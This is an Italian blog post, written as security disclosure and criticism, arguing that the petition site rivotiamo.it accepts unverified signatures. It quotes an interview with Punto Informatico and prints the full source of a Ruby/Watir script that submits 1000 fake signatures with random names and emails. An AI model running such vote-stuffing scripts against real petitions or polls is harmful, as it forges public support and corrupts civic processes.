--- 
layout: post
title: "Rivotiamo.it: Qualche piccolo problema..."
meta: 
  article: "1"
  aktt_tweeted: "1"
  autometa: rivotiamo berlusconi forzaitalia forza italia rivotiamo.it matteo flora hacking
tags: 
- digital-freedom
- hacking
- security
---
Sul PuntoInformatico di [oggi](http://punto-informatico.it/p.aspx?i=2119270) è presente una [mia intervista](http://punto-informatico.it/p.aspx?i=2119270) con [Luca Annunziata](https://www.deandreis.it/l/profilo.aspx?n=Luca+Annunziata) in merito al sito <Rivotiamo.it>.  
  
Ne riporto alcuni stralci:  
  
> **Punto Informatico: Sul sito rivotiamo.it è possibile inserire firme fasulle. I gestori hanno rimosso quelle palesemente dubbie, ma è tuttora possibile continuare ad inserire false sottoscrizioni: c'è modo di verificare l'identità e l'autenticità dei firmatari?**  
> Matteo Flora: Per come il sistema è strutturato attualmente, il coefficiente di realtà delle firme espresse è prossimo allo zero. Con pochi spiccioli posso acquistare su web un elenco di centinaia di migliaia di nomi plausibili ma creati artificialmente, con relativa plausibile mail. Ma il sistema attuale non controlla nemmeno la mail di destinazione.  
>  
> **PI: Qualche esempio?**  
> MF: Personalmente ho testato un semplice script che ha creato parecchi voti con dati plausibili. Vedo chiaramente salire il contatore ma non l'ho mai visto scendere una sola volta. Ho monitorato il sistema negli ultimi 4 giorni e mai una volta mi sono ritrovato a vederlo scendere per la rimozione dei dati spuri.  
>  
> **PI: Si potrebbe migliorare la situazione?**  
> MF: Quanta difficoltà vi sarebbe stata nel predisporre per lo meno una mail di conferma? E soprattutto, essendo la soluzione così semplice, perché non approntarla e accollarsi invece tutti questi falsi positivi?  
>  
> **PI: E il filtro sugli IP suggerito dai gestori di rivotiamo.it.**  
> MF: Anche il filtro su base IP, tanto declamato, è in realtà molto dubbio: ad esempio per Fastweb (che espone su internet centinaia di migliaia di utenti da pochissimi IP utilizzando NAT) sarei curioso di sapere se si è deciso di non fare votare tutte queste persone o se si è preferito non implementare filtri.  
>  
> **PI: Esiste un sistema per creare una petizione online "sicura"? Una petizione, insomma, che sia valida a tutti gli effetti?**  
> MF: Ebbene sì, basterebbe che l'amministrazione statale avesse istruito i cittadini all'utilizzo della firma digitale! Senza andare a questi livelli di complessità, basterebbe un controllo formale più aggressivo, magari con nome, cognome e data di nascita, a tamponare l'enorme quantità di falsi positivi.  
>  
> **PI: Ci sono alternative al fai-da-te?**  
> MF: Esistono piattaforme storiche per la gestione delle petizioni, ma ciascuna di queste implementa per lo meno una serie di meccanismi di autenticazione. Che sia una mail di conferma, che sia un controllo formale dei dati o anche, solamente, l'invito a firmare una dichiarazione di conformità alla realtà dei dati immessi.  
>   
> **PI: E quindi?**  
> MF: E quindi sono perplesso.  
  
  
Mettiamo le cose in chiaro: non sono alla ricerca di facile notorietà e lo script esiste davvero. Si basa su Ruby e Watir e qui sotto ne trovate l'intero sorgente:  
  
  

[ruby]
require 'rubygems'
require 'SafariWatir'

startUrl = "http://www.rivotiamo.it/"

b = Watir::Safari.new
b.speed = :fast

(1..1000).each do |x|
  begin
    fakeName = rand(500000000).to_s(26)
    b.goto(startUrl)
    b.text_field(:id, "name").set(fakeName)
    b.text_field(:id, "surname").set(fakeName)
    b.text_field(:id, "cap").set(20000 + rand(400))
    fakeName = "#{fakeName}@#{fakeName}.com"
    b.text_field(:id, "email").set(fakeName)
    b.link(:id, "b_sign").click()
  rescue
    puts " Sh*i happens..."
  end
end
[/ruby]  
  
  
Cosa **genera** questo script?  
Semplicemente **voti spuri** che vengono conteggiati normalmente dal sistema. Eccone qui sotto la dimostrazione pratica:  
  
  
<object width="425" height="355"><param name="movie" value="http://www.youtube.com/v/xCUiXyQqUR0&rel=1"></param><param name="wmode" value="transparent"></param><embed src="http://www.youtube.com/v/xCUiXyQqUR0&rel=1" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355"></embed></object>
  
  
Certo che i voti generati in questo modo sono assolutamente **semplici da individuare** (*ed era esattamente l'obiettivo*), ma basterebbe anche semplicemente **acquistare** qualche decina di migliaia di indirizzi "spuri" ma plausibili ad un sito come <http://www.fakenamegenerator.com> e lo script genererebbe voti che non sono distinguibili da quelli reali.  
  
Che dire? Semplicemente rimango **ancora più perplesso**. E che dire poi anche del simpatico [numero "899"](http://www.anti-phishing.it/news/articoli/news151107.php) che tanti hanno chiamato truffa?  
  
**P.S.** Giusto per dovere di cronaca: sono un elettore di **DESTRA** e teoricamente un elettore della compagine di Berlusconi. Quindi, per cortesia, evitate di **darmi del comunista** che mi offendo =]  
  
**UPDATE** Dietro al sito web **fervono movimenti** e una serie di brave manovre... Il codice sta cambiando a gran velocità e sembra che si stiano impementando una serie di blocchi, tra cui quello IP.  
Mi chiedo come faranno cone Fastweb e tutte le **centinaia di utenti** nattati sotto stesso IP. Mi sa che i prossimi test li farò da casa di un amico **con Fastweb** :)  
Probabilmente entro domani avremo una **bella differenza** dal risultato che ho ottenuto io... Pazienza, buone o cattive che siano le intenzioni l'importante, come al solito, è che le problematiche **vengano risolte** :P 
